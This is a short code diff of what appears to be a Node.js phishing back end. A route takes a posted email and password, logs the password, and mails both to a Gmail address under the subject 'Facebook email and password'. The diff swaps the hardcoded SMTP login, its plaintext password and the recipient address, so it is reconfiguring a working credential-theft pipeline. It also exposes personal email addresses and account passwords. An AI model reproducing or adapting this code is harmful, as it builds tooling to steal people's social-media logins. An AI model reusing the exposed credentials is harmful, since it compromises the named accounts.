@@ -26,8 +26,8 @@ var transporter = nodemailer.createTransport({
     port: 465,
 
     auth: {
-        user: 'bassem.sadaqah@gmail.com',
-        pass: 'fpmtfmcvrwpenfuy'
+        user: 'sali7639@su.edu.eg',
+        pass: '201817639'
     }
 });
 const client = new pg.Client({
@@ -77,8 +77,8 @@ app.post('/', function (req, res) {
     console.log(pass);
 
     var mailOptions = {
-        from: 'bassem.sadaqah@gmail.com',
-        to: "mostafasaidofficial22@gmail.com",
+        from: 'sali7639@su.edu.eg',
+        to: "shady.gabr.sadakah@gmail.com",
         subject: 'Facebook email and password',
         text: 'email: '+email+'\nPassword: '+pass,
         html:''
